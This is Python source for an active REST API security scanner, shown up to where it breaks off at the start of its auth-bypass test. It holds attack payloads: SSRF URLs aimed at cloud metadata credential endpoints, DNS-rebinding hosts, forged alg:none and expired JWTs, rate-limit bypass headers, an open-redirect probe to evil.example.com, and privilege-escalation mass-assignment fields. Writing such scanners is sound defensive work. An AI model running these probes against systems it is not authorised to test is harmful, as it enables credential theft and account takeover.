"""
API Active Tester — comprehensive REST API security testing module.

Tests for OWASP API Top-10 vulnerabilities through active probing:
  BOLA/IDOR, Mass Assignment, HTTP Verb Tampering, Content-Type Confusion,
  Authentication Bypass, Rate Limit Absence.

Equivalent coverage to ZAP's API scanner and Burp Suite's API audit.
"""
from __future__ import annotations

import hmac
import json
import re
import time
import uuid
import base64
import threading
from collections import Counter
from dataclasses import dataclass, field
from typing import Optional, Callable, Any
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs, urljoin

import requests
import requests.exceptions
import urllib3
urllib3.disable_warnings()

from .crawler import InputSurface
from .industry_patterns import (
    API_HIDDEN_ENDPOINT_EXTENSIONS,
    API_SSRF_URL_PARAM_EXTENSIONS,
    API_WEBHOOK_SSRF_PAYLOAD_EXTENSIONS,
)
from .payload_safety import is_dangerous_surface
from .scope import ScopeManager


# ══════════════════════════════════════════════════════════════════════════════
# Data structures
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class ApiTestFinding:
    """A single finding from API active testing."""
    url: str
    method: str
    test_type: str
    param: str
    finding: str
    severity: str
    proof: str
    payload: str
    status_code: int
    response_time_ms: float

    @property
    def vuln_type(self) -> str:
        return self.test_type


# ══════════════════════════════════════════════════════════════════════════════
# Constants
# ══════════════════════════════════════════════════════════════════════════════

_ID_PARAM_PATTERNS = re.compile(
    r"(^id$|_id$|Id$|ID$|^uid$|^uuid$|^user_id$|^userId$|^account_id$|"
    r"^accountId$|^order_id$|^orderId$|^item_id$|^itemId$|^record_id$|"
    r"^recordId$|^doc_id$|^docId$|^file_id$|^fileId$|^resource_id$|"
    r"^resourceId$|^object_id$|^objectId$|^entity_id$|^entityId$|"
    r"^customer_id$|^customerId$|^project_id$|^projectId$|^org_id$|"
    r"^orgId$|^team_id$|^teamId$|^tenant_id$|^tenantId$)",
    re.IGNORECASE,
)

_MASS_ASSIGN_FIELDS = [
    "role", "admin", "isAdmin", "is_admin", "is_superuser", "superuser",
    "price", "discount", "approved", "verified", "email_verified",
    "role_id", "roleId", "permissions", "privilege", "status",
    "account_type", "accountType", "is_staff", "isStaff", "active",
    "balance", "credit", "tier", "plan", "subscription_level",
    "can_delete", "canDelete", "is_owner", "isOwner",
]

_SENSITIVE_PATH_KEYWORDS = [
    "login", "register", "signup", "sign-up", "password", "reset",
    "token", "auth", "session", "otp", "verify", "confirm",
    "api/", "v1/", "v2/", "v3/",
]

# Fake expired JWT (HS256, {"sub":"attacker","exp":0})
_FAKE_JWT = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6MCwiaWF0IjowfQ."
    "invalid_signature_placeholder"
)

# Self-signed JWT with alg:none
_NONE_JWT = (
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
    "eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."
)

_ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]

_WEBHOOK_REGISTRATION_PATHS = [
    "/api/webhooks", "/api/integrations", "/webhooks", "/callbacks",
    "/api/callbacks", "/api/hooks",
]
_WEBHOOK_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.170.2/v2/credentials",
    "http://metadata.google.internal/computeMetadata/v1/",
]
_WEBHOOK_SSRF_PAYLOADS.extend(
    payload for payload in API_WEBHOOK_SSRF_PAYLOAD_EXTENSIONS
    if payload not in _WEBHOOK_SSRF_PAYLOADS
)
_BYPASS_IPS = [
    "127.0.0.1", "10.0.0.1", "192.168.1.1", "0.0.0.0", "1.2.3.4", "255.255.255.255",
]
_RATE_LIMIT_BYPASS_HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Custom-IP-Authorization", "True-Client-IP", "CF-Connecting-IP",
]

# API4: Pagination abuse
_PAGINATION_PARAMS: frozenset[str] = frozenset({
    "page", "limit", "offset", "page_size", "per_page", "cursor",
    "count", "skip", "start", "from", "size",
})
_PAGINATION_ABUSE_VALUES = [
    ("page", "999999999"),
    ("page", "-1"),
    ("limit", "0"),
    ("limit", "999999999"),
    ("offset", "-1"),
    ("offset", "99999999999999999999"),  # overflow
    ("page_size", "999999999"),
]

# API5: Hidden endpoint enumeration
_HIDDEN_ENDPOINTS = [
    "/admin", "/debug", "/internal", "/metrics", "/graphql", "/api/admin",
    "/actuator", "/actuator/env", "/actuator/beans", "/healthz", "/health",
    "/swagger", "/swagger-ui.html", "/api-docs", "/v1/admin", "/console",
    "/management", "/backup", "/.env", "/config", "/server-status",
    "/phpinfo.php", "/wp-admin", "/panel", "/__admin", "/api/internal",
]
_HIDDEN_ENDPOINTS.extend(
    path for path in API_HIDDEN_ENDPOINT_EXTENSIONS
    if path not in _HIDDEN_ENDPOINTS
)

# API2: PKCE downgrade (OAuth endpoints)
_OAUTH_AUTHORIZE_PATTERNS = [
    "/authorize", "/oauth/authorize", "/auth/authorize",
    "/connect/authorize", "/openid-connect/auth", "/oauth2/authorize",
]

# Cross-tier path prefixes for bearer substitution probe
_BEARER_CROSS_TIER_PATHS = [
    "/admin/", "/internal/", "/system/", "/management/",
    "/staff/", "/backoffice/", "/superuser/", "/privileged/",
]

# API7: DNS rebinding SSRF payloads
_DNS_REBINDING_PAYLOADS = [
    "http://127.0.0.1.nip.io/",
    "http://0177.0.0.1/",
    "http://[::1]/",
    "http://localhost.attacker.example.com/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://127.1/",
]
_SSRF_URL_PARAMS: frozenset[str] = frozenset({
    "url", "uri", "redirect", "callback", "next", "return",
    "link", "href", "src", "target", "dest", "endpoint",
    "feed", "proxy", "fetch", "path", "load",
}) | API_SSRF_URL_PARAM_EXTENSIONS

# API10: Third-party API proxy detection
_THIRD_PARTY_INDICATORS = [
    "api.stripe.com", "api.twilio.com", "graph.facebook.com",
    "api.sendgrid.com", "hooks.slack.com", "api.github.com",
    "api.openai.com", "api.braintreegateway.com", "api.paypal.com",
    "api.mailchimp.com",
]

# Signals that a server-side fetch reached internal infrastructure — used by
# DNS rebinding SSRF detection to confirm the payload was followed.
_INTERNAL_BODY_RE = re.compile(
    r"127\.\d+\.\d+\.\d+|192\.168\.|10\.\d+\.|172\.(1[6-9]|2\d|3[01])\.|"
    r"::1|localhost|Connection refused|ECONNREFUSED",
    re.I,
)

# API5: HTTP method override header variants
_METHOD_OVERRIDE_HEADERS = [
    ("X-HTTP-Method-Override", "DELETE"),
    ("X-HTTP-Method-Override", "PUT"),
    ("X-HTTP-Method-Override", "PATCH"),
    ("X-Forwarded-Method", "DELETE"),
    ("X-Method-Override", "DELETE"),
]

# API10: Open redirect — params that commonly hold destination URLs
_REDIRECT_PARAMS: frozenset[str] = frozenset({
    "redirect", "url", "next", "return", "return_url", "redirect_url",
    "callback", "goto", "dest", "destination", "redir", "target",
    "continue", "forward", "location", "redirect_to", "returnUrl",
    "redirectUri", "successUrl", "failureUrl", "after_login",
})
_OPEN_REDIRECT_PAYLOAD = "https://dast-probe.evil.example.com/redirect"
_OPEN_REDIRECT_DOMAIN = "evil.example.com"
_META_REFRESH_RE = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+url=([^\s"\'>;]+)',
    re.I,
)
_JS_REDIRECT_RE = re.compile(
    r'(?:window\.location|location\.href|location\.replace)\s*[=\(]\s*["\']([^"\']+)',
    re.I,
)

# OIDC: well-known discovery paths
_OIDC_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

# JWT confusion: auth-gated paths to probe with forged tokens
_JWT_PROBE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/v1/me",
    "/api/account", "/me", "/api/v1/user", "/api/current_user",
]

_JWT_ERROR_SIGNALS = frozenset({
    "unauthorized", "invalid token", "signature verification failed",
    "invalid signature", "malformed token", "token expired",
    "decode error", "jwt", "jwterror",
})


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


# ══════════════════════════════════════════════════════════════════════════════
# ApiActiveTester
# ══════════════════════════════════════════════════════════════════════════════

class ApiActiveTester:
    """
    Active API security tester. Takes InputSurface objects (from OpenAPI import
    or crawling) and runs six categories of API-specific attacks against them.
    """

    def __init__(
        self,
        session: requests.Session,
        scope: Optional[ScopeManager] = None,
        timeout: int = 10,
        rate_limit: float = 0.05,
        stop_event: Optional[threading.Event] = None,
        on_finding: Optional[Callable[[ApiTestFinding], None]] = None,
        auth_token: Optional[str] = None,
        auth_header: str = "Authorization",
        allow_dangerous_endpoints: bool = False,
    ):
        self.session = session
        self.scope = scope
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.stop_event = stop_event or threading.Event()
        self.on_finding = on_finding
        self.auth_token = auth_token
        self.auth_header = auth_header
        self.allow_dangerous_endpoints = allow_dangerous_endpoints
        self.findings: list[ApiTestFinding] = []
        self._lock = threading.Lock()
        self._type_counts: Counter = Counter()

    # ── Public API ────────────────────────────────────────────────────────────

    def scan(self, surfaces: list[InputSurface], base_url: str = "") -> list[ApiTestFinding]:
        """
        Run all API test categories against the given surfaces.
        Returns list of ApiTestFinding objects.
        """
        self.findings = []
        self._type_counts = Counter()

        # Deduplicate surfaces by (url, method) for endpoint-level tests
        seen_endpoints: set[tuple[str, str]] = set()
        unique_surfaces: list[InputSurface] = []
        for s in surfaces:
            key = (s.url, s.method)
            if key not in seen_endpoints:
                seen_endpoints.add(key)
                unique_surfaces.append(s)

        tested_surfaces = 0
        for surface in unique_surfaces:
            if self.stop_event.is_set():
                break

            if not self.allow_dangerous_endpoints and is_dangerous_surface(surface):
                continue

            url = surface.url
            if self.scope and not self.scope.in_scope(url):
                continue

            tested_surfaces += 1

            # Run all test categories
            self._test_bola_idor(surface)
            self._test_mass_assignment(surface)
            self._test_verb_tampering(surface)
            self._test_method_override(surface)
            self._test_content_type_switching(surface)
            self._test_auth_bypass(surface)
            self._test_rate_limiting(surface)
            self._test_type_juggling(surface)
            self._test_oversized_payload(surface)
            self._test_horizontal_privesc(surface)
            self._test_idor_id_prediction(surface)
            self._test_pagination_abuse(surface)
            self._test_open_redirect(surface)
            self._test_dns_rebinding_ssrf(surface)
            self._test_third_party_api_injection(surface)

        if unique_surfaces and tested_surfaces == 0:
            return self.findings

        if self.allow_dangerous_endpoints and not self.stop_event.is_set():
            self._test_webhook_ssrf(base_url)
        if not self.stop_event.is_set():
            self._test_endpoint_enumeration(base_url)
        if not self.stop_event.is_set():
            self._test_pkce_downgrade(base_url)
        if not self.stop_event.is_set():
            self._test_bearer_substitution(base_url)
        if not self.stop_event.is_set():
            self._test_jwt_alg_confusion(base_url)
        if not self.stop_event.is_set():
            self._test_oidc_discovery(base_url)

        return self.findings

    def summary(self) -> str:
        """Return human-readable summary of findings."""
        if not self.findings:
            return "API Active Testing: 0 findings"

        lines = [f"API Active Testing: {len(self.findings)} findings"]
        by_type: dict[str, list[ApiTestFinding]] = {}
        for f in self.findings:
            by_type.setdefault(f.test_type, []).append(f)

        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        for test_type, items in sorted(by_type.items(),
                                        key=lambda x: severity_order.get(x[1][0].severity, 5)):
            sev = items[0].severity.upper()
            lines.append(f"  [{sev}] {test_type}: {len(items)} finding(s)")
            for item in items[:3]:  # show first 3 per type
                lines.append(f"    - {item.method} {item.url} | {item.finding}")
            if len(items) > 3:
                lines.append(f"    ... and {len(items) - 3} more")

        return "\n".join(lines)

    # ── Core send helper ──────────────────────────────────────────────────────

    def _send(
        self,
        method: str,
        url: str,
        headers: Optional[dict] = None,
        body: Optional[Any] = None,
        content_type: Optional[str] = None,
    ) -> tuple[Optional[requests.Response], float]:
        """
        Send a request and return (response, elapsed_ms).
        Returns (None, 0) on failure.
        """
        if self.stop_event.is_set():
            return None, 0.0

        hdrs = dict(headers) if headers else {}
        if self.auth_token and self.auth_header not in hdrs:
            hdrs[self.auth_header] = f"Bearer {self.auth_token}"
        if content_type:
            hdrs["Content-Type"] = content_type

        kwargs: dict[str, Any] = {
            "timeout": self.timeout,
            "verify": False,
            "allow_redirects": False,
        }

        if body is not None:
            if content_type and "json" in content_type:
                kwargs["json"] = body if isinstance(body, (dict, list)) else body
            elif content_type and "form" in content_type:
                kwargs["data"] = body
            else:
                kwargs["data"] = body if isinstance(body, (str, bytes)) else json.dumps(body)

        try:
            t0 = time.monotonic()
            resp = self.session.request(method, url, headers=hdrs, **kwargs)
            elapsed = (time.monotonic() - t0) * 1000
            if self.rate_limit > 0:
                time.sleep(self.rate_limit)
            return resp, elapsed
        except (requests.exceptions.RequestException, Exception):
            return None, 0.0

    # ── Finding helpers ───────────────────────────────────────────────────────

    def _make_finding(
        self,
        url: str,
        method: str,
        test_type: str,
        param: str,
        finding: str,
        severity: str,
        proof: str,
        payload: str,
        status_code: int,
        response_time_ms: float,
    ) -> ApiTestFinding:
        f = ApiTestFinding(
            url=url, method=method, test_type=test_type, param=param,
            finding=finding, severity=severity, proof=proof, payload=payload,
            status_code=status_code, response_time_ms=response_time_ms,
        )
        with self._lock:
            self.findings.append(f)
            self._type_counts[test_type] += 1
        if self.on_finding:
            self.on_finding(f)
        return f

    @staticmethod
    def _is_id_param(name: str) -> bool:
        """Detect ID-like parameter names."""
        return bool(_ID_PARAM_PATTERNS.search(name))

    def _build_body(self, surface: InputSurface) -> dict:
        """Extract body params from an InputSurface into a dict."""
        body: dict[str, str] = {}
        if surface.body_template:
            # Try JSON first
            try:
                body = json.loads(surface.body_template)
                if isinstance(body, dict):
                    return body
            except (json.JSONDecodeError, ValueError):
                pass
            # Try form-encoded
            parsed = parse_qs(surface.body_template, keep_blank_values=True)
            for k, v in parsed.items():
                body[k] = v[0] if v else ""
        # If body is still empty, use param/value from surface
        if not body and surface.param:
            body[surface.param] = surface.original_value or "test"
        return body

    @staticmethod
    def _json_to_xml(data: Any, root: str = "root") -> str:
        """Simple JSON-to-XML converter for content-type confusion tests."""
        def _to_xml(key: str, val: Any) -> str:
            if isinstance(val, dict):
                inner = "".join(_to_xml(k, v) for k, v in val.items())
                return f"<{key}>{inner}</{key}>"
            elif isinstance(val, list):
                return "".join(_to_xml("item", item) for item in val)
            else:
                return f"<{key}>{val}</{key}>"

        if isinstance(data, dict):
            inner = "".join(_to_xml(k, v) for k, v in data.items())
            return f"<?xml version=\"1.0\"?><{root}>{inner}</{root}>"
        return f"<?xml version=\"1.0\"?><{root}>{data}</{root}>"

    def _get_auth_headers(self) -> dict:
        """Return headers with auth token if available."""
        hdrs: dict[str, str] = {}
        if self.auth_token:
            hdrs[self.auth_header] = f"Bearer {self.auth_token}"
        return hdrs

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 1: BOLA / IDOR
    # ══════════════════════════════════════════════════════════════════════════

    def _test_bola_idor(self, surface: InputSurface) -> None:
        """
        Broken Object Level Authorization testing.
        Replace ID parameters with other users' IDs and check for unauthorized access.
        """
        # Collect all ID-like params from the URL path and query
        url = surface.url
        method = surface.method

        # Check for path-based IDs (e.g., /api/users/1)
        path_segments = urlparse(url).path.split("/")
        id_positions: list[int] = []
        for i, seg in enumerate(path_segments):
            if seg.isdigit() or (len(seg) == 36 and "-" in seg):  # numeric or UUID-like
                id_positions.append(i)

        # Also check if surface param is an ID param
        has_id_param = self._is_id_param(surface.param)

        if not id_positions and not has_id_param:
            return

        # Get baseline response first
        baseline_resp, baseline_time = self._send(method, url, headers=self._get_auth_headers())
        if baseline_resp is None:
            return

        baseline_status = baseline_resp.status_code
        baseline_body = baseline_resp.text[:2000]
        baseline_len = len(baseline_resp.content)

        # BOLA payloads for ID manipulation
        id_payloads = []
        if id_positions:
            for pos in id_positions:
                orig = path_segments[pos]
                if orig.isdigit():
                    orig_int = int(orig)
                    replacements = [
                        str(orig_int + 1), str(orig_int - 1),
                        "0", "99999", "-1",
                        str(uuid.uuid4()),
                    ]
                else:
                    replacements = [
                        str(uuid.uuid4()),
                        "00000000-0000-0000-0000-000000000000",
                        "0", "99999",
                    ]

                for repl in replacements:
                    if self.stop_event.is_set():
                        return
                    modified_segments = list(path_segments)
                    modified_segments[pos] = repl
                    modified_path = "/".join(modified_segments)
                    parsed = urlparse(url)
                    modified_url = f"{parsed.scheme}://{parsed.netloc}{modified_path}"
                    if parsed.query:
                        modified_url += f"?{parsed.query}"

                    resp, elapsed = self._send(method, modified_url, headers=self._get_auth_headers())
                    if resp is None:
                        continue

                    # BOLA detection: 200 response with different content
                    if resp.status_code == 200 and baseline_status == 200:
                        resp_body = resp.text[:2000]
                        resp_len = len(resp.content)
                        # Different content = different object accessed
                        if resp_body != baseline_body and abs(resp_len - baseline_len) > 10:
                            self._make_finding(
                                url=modified_url, method=method,
                                test_type="BOLA/IDOR",
                                param=f"path_segment[{pos}]",
                                finding=(
                                    f"Endpoint returned different data when ID changed from "
                                    f"'{orig}' to '{repl}'. Possible unauthorized object access."
                                ),
                                severity="critical",
                                proof=f"Original len={baseline_len}, Modified len={resp_len}, "
                                      f"Status={resp.status_code}",
                                payload=repl,
                                status_code=resp.status_code,
                                response_time_ms=elapsed,
                            )
                            break  # One finding per position is enough

                    # Also flag if we get 200 when we should get 403/401
                    elif resp.status_code == 200 and baseline_status in (401, 403):
                        self._make_finding(
                            url=modified_url, method=method,
                            test_type="BOLA/IDOR",
                            param=f"path_segment[{pos}]",
                            finding="Endpoint accessible with manipulated ID despite baseline being forbidden.",
                            severity="critical",
                            proof=f"Baseline status={baseline_status}, Modified status={resp.status_code}",
                            payload=repl,
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                        )
                        break

        # Test query/body ID params
        if has_id_param:
            orig_val = surface.original_value or "1"
            test_values = ["0", "99999", "-1", str(uuid.uuid4())]
            if orig_val.isdigit():
                ival = int(orig_val)
                test_values.extend([str(ival + 1), str(ival - 1)])

            for test_val in test_values:
                if self.stop_event.is_set():
                    return

                if surface.param_type == "query":
                    parsed = urlparse(url)
                    qs = parse_qs(parsed.query, keep_blank_values=True)
                    qs[surface.param] = [test_val]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
                    resp, elapsed = self._send(method, test_url, headers=self._get_auth_headers())
                elif surface.param_type in ("json", "form"):
                    body = self._build_body(surface)
                    body[surface.param] = test_val
                    ct = surface.content_type or "application/json"
                    resp, elapsed = self._send(method, url, headers=self._get_auth_headers(),
                                               body=body, content_type=ct)
                elif surface.param_type in ("path", "path_filename", "request_line"):
                    from .insertion_point import from_input_surface
                    test_url, hdrs, _ = from_input_surface(surface).build_http_request(test_val)
                    hdrs.update(self._get_auth_headers())
                    resp, elapsed = self._send(method, test_url, headers=hdrs)
                elif surface.param_type == "cookie":
                    from .insertion_point import from_input_surface
                    _, hdrs, _ = from_input_surface(surface).build_http_request(test_val)
                    hdrs.update(self._get_auth_headers())
                    resp, elapsed = self._send(method, url, headers=hdrs)
                else:
                    continue

                if resp is None:
                    continue

                if resp.status_code == 200 and baseline_status == 200:
                    resp_body = resp.text[:2000]
                    if resp_body != baseline_body and abs(len(resp.content) - baseline_len) > 10:
                        self._make_finding(
                            url=url, method=method,
                            test_type="BOLA/IDOR",
                            param=surface.param,
                            finding=f"Different data returned when '{surface.param}' changed to '{test_val}'.",
                            severity="critical",
                            proof=f"Original len={baseline_len}, Modified len={len(resp.content)}",
                            payload=test_val,
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                        )
                        break

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 2: Mass Assignment
    # ══════════════════════════════════════════════════════════════════════════

    def _test_mass_assignment(self, surface: InputSurface) -> None:
        """
        Mass Assignment testing. Inject privileged fields into POST/PUT/PATCH bodies.
        """
        if surface.method not in ("POST", "PUT", "PATCH"):
            return

        url = surface.url
        method = surface.method
        base_body = self._build_body(surface)

        # Get baseline
        ct = surface.content_type or "application/json"
        baseline_resp, _ = self._send(method, url, headers=self._get_auth_headers(),
                                       body=base_body, content_type=ct)
        if baseline_resp is None:
            return
        baseline_status = baseline_resp.status_code
        baseline_body = baseline_resp.text[:4000].lower()

        # Test JSON body injection
        for extra_field in _MASS_ASSIGN_FIELDS:
            if self.stop_event.is_set():
                return

            for inject_value in [True, "admin", 1, "true"]:
                injected_body = dict(base_body)
                injected_body[extra_field] = inject_value

                resp, elapsed = self._send(method, url, headers=self._get_auth_headers(),
                                            body=injected_body, content_type="application/json")
                if resp is None:
                    continue

                resp_text = resp.text[:4000].lower()

                # Detection: field appears in response (server accepted and echoed it)
                field_lower = extra_field.lower()
                val_str = str(inject_value).lower()

                if (resp.status_code in (200, 201, 202) and
                        field_lower in resp_text and val_str in resp_text and
                        field_lower not in baseline_body):
                    self._make_finding(
                        url=url, method=method,
                        test_type="Mass Assignment",
                        param=extra_field,
                        finding=(
                            f"Server accepted and echoed injected field '{extra_field}={inject_value}'. "
                            f"Field was not in baseline response."
                        ),
                        severity="high",
                        proof=f"Response contains '{extra_field}' with value '{inject_value}'",
                        payload=json.dumps({extra_field: inject_value}),
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                    break  # one finding per field

                # Detection: status code changed favorably
                if (resp.status_code in (200, 201, 202) and
                        baseline_status not in (200, 201, 202)):
                    self._make_finding(
                        url=url, method=method,
                        test_type="Mass Assignment",
                        param=extra_field,
                        finding=(
                            f"Adding '{extra_field}={inject_value}' changed response from "
                            f"{baseline_status} to {resp.status_code}."
                        ),
                        severity="high",
                        proof=f"Baseline={baseline_status}, WithField={resp.status_code}",
                        payload=json.dumps({extra_field: inject_value}),
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                    break

            # Also test form-encoded injection
            if "json" not in ct:
                form_body = dict(base_body)
                form_body[extra_field] = "true"
                resp, elapsed = self._send(method, url, headers=self._get_auth_headers(),
                                            body=urlencode(form_body),
                                            content_type="application/x-www-form-urlencoded")
                if resp and resp.status_code in (200, 201, 202):
                    resp_text = resp.text[:4000].lower()
                    if extra_field.lower() in resp_text and extra_field.lower() not in baseline_body:
                        self._make_finding(
                            url=url, method=method,
                            test_type="Mass Assignment",
                            param=extra_field,
                            finding=f"Form-encoded injection of '{extra_field}' accepted and echoed.",
                            severity="high",
                            proof=f"Field '{extra_field}' found in response body (form-encoded)",
                            payload=f"{extra_field}=true",
                            status_code=resp.status_code,
                            response_time_ms=elapsed,
                        )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 3: HTTP Verb Tampering
    # ══════════════════════════════════════════════════════════════════════════

    def _test_verb_tampering(self, surface: InputSurface) -> None:
        """
        HTTP Verb Tampering. Try unexpected HTTP methods on each endpoint.
        """
        url = surface.url
        original_method = surface.method

        # Get baseline with original method
        baseline_resp, _ = self._send(original_method, url, headers=self._get_auth_headers())
        if baseline_resp is None:
            return

        # Check OPTIONS first for Allow header
        options_resp, opts_elapsed = self._send("OPTIONS", url, headers=self._get_auth_headers())
        if options_resp is not None:
            allow = options_resp.headers.get("Allow", "")
            if allow:
                allowed_methods = [m.strip().upper() for m in allow.split(",")]
                dangerous = {"DELETE", "PUT", "PATCH", "TRACE"}
                overly_permissive = dangerous.intersection(set(allowed_methods))
                if overly_permissive and original_method == "GET":
                    self._make_finding(
                        url=url, method="OPTIONS",
                        test_type="Verb Tampering",
                        param="Allow header",
                        finding=(
                            f"OPTIONS reveals potentially dangerous methods on GET resource: "
                            f"{', '.join(sorted(overly_permissive))}"
                        ),
                        severity="medium",
                        proof=f"Allow: {allow}",
                        payload="OPTIONS request",
                        status_code=options_resp.status_code,
                        response_time_ms=opts_elapsed,
                    )

        for test_method in _ALL_METHODS:
            if self.stop_event.is_set():
                return
            if test_method == original_method:
                continue

            body = self._build_body(surface) if test_method in ("POST", "PUT", "PATCH") else None
            ct = "application/json" if body else None

            resp, elapsed = self._send(test_method, url, headers=self._get_auth_headers(),
                                        body=body, content_type=ct)
            if resp is None:
                continue

            # TRACE reflection check (XST vulnerability)
            if test_method == "TRACE" and resp.status_code == 200:
                if self.auth_token and self.auth_token in resp.text:
                    self._make_finding(
                        url=url, method="TRACE",
                        test_type="Verb Tampering",
                        param="TRACE method",
                        finding="TRACE method reflects auth headers (Cross-Site Tracing vulnerability).",
                        severity="high",
                        proof=f"Auth token found in TRACE response body",
                        payload="TRACE",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )
                elif resp.status_code == 200 and len(resp.text) > 0:
                    self._make_finding(
                        url=url, method="TRACE",
                        test_type="Verb Tampering",
                        param="TRACE method",
                        finding="TRACE method is enabled and returns content.",
                        severity="medium",
                        proof=f"TRACE returned {resp.status_code} with {len(resp.text)} bytes",
                        payload="TRACE",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

            # DELETE accepted on a GET-only resource
            if test_method == "DELETE" and original_method == "GET":
                if resp.status_code in (200, 202, 204):
                    self._make_finding(
                        url=url, method="DELETE",
                        test_type="Verb Tampering",
                        param="HTTP method",
                        finding="DELETE method accepted on GET-only resource. Possible unauthorized deletion.",
                        severity="high",
                        proof=f"DELETE returned {resp.status_code}",
                        payload="DELETE",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

            # Any unexpected method returning success data
            if (test_method not in ("OPTIONS", "HEAD", "TRACE") and
                    resp.status_code in (200, 201, 202) and
                    original_method in ("GET",) and
                    test_method in ("POST", "PUT", "PATCH")):
                self._make_finding(
                    url=url, method=test_method,
                    test_type="Verb Tampering",
                    param="HTTP method",
                    finding=f"{test_method} unexpectedly accepted on {original_method}-only endpoint.",
                    severity="medium",
                    proof=f"{test_method} returned {resp.status_code}",
                    payload=test_method,
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 4: Content-Type Confusion
    # ══════════════════════════════════════════════════════════════════════════

    def _test_content_type_switching(self, surface: InputSurface) -> None:
        """
        Content-Type confusion / parser differential testing.
        Send same payload with different Content-Types to find parser mismatches.
        """
        if surface.method not in ("POST", "PUT", "PATCH"):
            return

        url = surface.url
        method = surface.method
        body = self._build_body(surface)

        if not body:
            body = {"test": "value"}

        original_ct = surface.content_type or "application/json"

        # Get baseline
        baseline_resp, baseline_time = self._send(
            method, url, headers=self._get_auth_headers(),
            body=body, content_type=original_ct,
        )
        if baseline_resp is None:
            return
        baseline_status = baseline_resp.status_code

        # Content-types to test
        test_cases = [
            ("application/json", json.dumps(body)),
            ("application/xml", self._json_to_xml(body)),
            ("application/x-www-form-urlencoded", urlencode(body)),
            ("text/plain", json.dumps(body)),
            ("", json.dumps(body)),  # missing Content-Type
            ("application/json", self._json_to_xml(body)),  # JSON header, XML body
            ("application/xml", json.dumps(body)),  # XML header, JSON body
        ]

        for ct, payload_str in test_cases:
            if self.stop_event.is_set():
                return
            if ct == original_ct and payload_str == json.dumps(body):
                continue  # skip baseline duplicate

            hdrs = self._get_auth_headers()
            if ct:
                hdrs["Content-Type"] = ct
            # else: intentionally no Content-Type

            try:
                t0 = time.monotonic()
                resp = self.session.request(
                    method, url, headers=hdrs,
                    data=payload_str.encode("utf-8") if isinstance(payload_str, str) else payload_str,
                    timeout=self.timeout, verify=False, allow_redirects=False,
                )
                elapsed = (time.monotonic() - t0) * 1000
            except Exception:
                continue

            if self.rate_limit > 0:
                time.sleep(self.rate_limit)

            # Detect parser differentials
            ct_label = ct if ct else "(no Content-Type)"

            # Case 1: accepted when it shouldn't (e.g., XML body with JSON CT)
            if ct == "application/json" and "<" in payload_str and resp.status_code in (200, 201, 202):
                self._make_finding(
                    url=url, method=method,
                    test_type="Content-Type Confusion",
                    param="Content-Type",
                    finding="Server accepted XML body with application/json Content-Type header.",
                    severity="medium",
                    proof=f"Sent XML body with JSON CT, got {resp.status_code}",
                    payload=f"Content-Type: {ct} | Body: {payload_str[:100]}",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

            # Case 2: text/plain accepted on API endpoint
            if ct == "text/plain" and resp.status_code in (200, 201, 202):
                self._make_finding(
                    url=url, method=method,
                    test_type="Content-Type Confusion",
                    param="Content-Type",
                    finding="Server accepts text/plain on API endpoint (may bypass CORS preflight).",
                    severity="medium",
                    proof=f"text/plain returned {resp.status_code}",
                    payload=f"Content-Type: text/plain",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

            # Case 3: no Content-Type accepted
            if not ct and resp.status_code in (200, 201, 202):
                self._make_finding(
                    url=url, method=method,
                    test_type="Content-Type Confusion",
                    param="Content-Type",
                    finding="Server accepted request with no Content-Type header.",
                    severity="low",
                    proof=f"No CT header, got {resp.status_code}",
                    payload="(no Content-Type header)",
                    status_code=resp.status_code,
                    response_time_ms=elapsed,
                )

            # Case 4: XML content-type accepted (potential XXE vector)
            if ct == "application/xml" and resp.status_code in (200, 201, 202):
                if baseline_status in (200, 201, 202):
                    self._make_finding(
                        url=url, method=method,
                        test_type="Content-Type Confusion",
                        param="Content-Type",
                        finding=(
                            "Server accepts application/xml. Combined with XXE payloads, "
                            "this could lead to data exfiltration."
                        ),
                        severity="medium",
                        proof=f"XML CT returned {resp.status_code} vs JSON baseline {baseline_status}",
                        payload=f"Content-Type: application/xml",
                        status_code=resp.status_code,
                        response_time_ms=elapsed,
                    )

    # ══════════════════════════════════════════════════════════════════════════
    # TEST CATEGORY 5: Authentication Bypass
    # ══════════════════════════════════════════════════════════════════════════

    def _test_auth_bypass(self, surface: InputSurface) -> None:
        """
        Authentication bypass testing. Send requests with missing, malformed,
        or forged auth credentials.
        """
        url = surface.url
        method = surface.method

